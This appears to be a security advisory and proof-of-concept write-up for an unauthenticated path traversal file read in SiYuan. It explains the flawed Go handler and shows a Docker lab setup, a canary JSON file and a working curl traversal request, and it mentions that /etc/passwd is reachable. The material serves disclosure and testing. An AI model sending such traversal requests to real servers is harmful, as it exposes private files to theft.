# GHSA-hhgj-gg9h-rjp7

Unauthenticated arbitrary file read via path traversal in [SiYuan](https://github.com/siyuan-note/siyuan)
`<= v3.6.1` (`CVE-2026-33476`). The `GET /appearance/*filepath` route joins the raw
request path onto the appearance directory:

```go
// kernel/server/serve.go
filePath := filepath.Join(appearancePath, strings.TrimPrefix(c.Request.URL.Path, "/appearance/"))
```

`c.File()` (Go's `http.ServeFile`) rejects `..`, but the special-cased
`/langs/*.json` branch reads the joined path with `os.ReadFile(filePath)` directly —
no `..` check — and returns the parsed JSON. So a request whose path contains
`/langs/`, ends in `.json`, and uses `../` traverses out of the appearance directory
and reads any JSON file on disk. Fixed in `v3.6.2`.

Sources:

- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-hhgj-gg9h-rjp7
- https://github.com/advisories/GHSA-hhgj-gg9h-rjp7

## Reproduce

```bash
# v3.6.0 is an affected version (advisory: <= v3.6.1; the v3.6.1 image tag is not
# published on Docker Hub, v3.6.0 carries the identical vulnerable handler).
mkdir -p siyuan-workspace/data
# Plant a JSON canary OUTSIDE the appearance directory (the langs branch only
# leaks valid JSON, so the target must be JSON):
cat > siyuan-workspace/data/canary.json <<'JSON'
{"NOCAPSEC_CANARY_8f3a1c":"leaked-via-path-traversal","note":"this file lives in workspace/data, outside conf/appearance"}
JSON

docker run -d --name siyuan-poc -p 127.0.0.1:6806:6806 \
  -v "$PWD/siyuan-workspace":/siyuan/workspace \
  b3log/siyuan:v3.6.0 --workspace=/siyuan/workspace/ --accessAuthCode=nocapsecpoc
```

Manual check (the `/langs/` + `.json` bypass; note `--path-as-is`):

```bash
curl -s --path-as-is "http://127.0.0.1:6806/appearance/langs/../../../data/canary.json" | head -c 120
# -> {"NOCAPSEC_CANARY_8f3a1c":"leaked-via-path-traversal", ... }   (merged with en_US.json)
```

In another terminal from the `nocapsec` repo:

```bash
go run ./examples/path-traversal-file-read-siyuan
```

The engine builds both arms from one `base_request` by substituting each payload
into the `{{path}}` `url_token` slot — the candidate (`../../../data/canary.json`)
and the benign control (`en_US.json`); the client never authors two independent
requests. A verified report proves the canary marker is present in the traversal
response and absent from the control — arbitrary read out of the appearance
directory. (`/etc/passwd` is reachable by the same flaw via
`c.File`, but the JSON-only `/langs/` branch is what bypasses the `..` guard, so the
canary is JSON.)
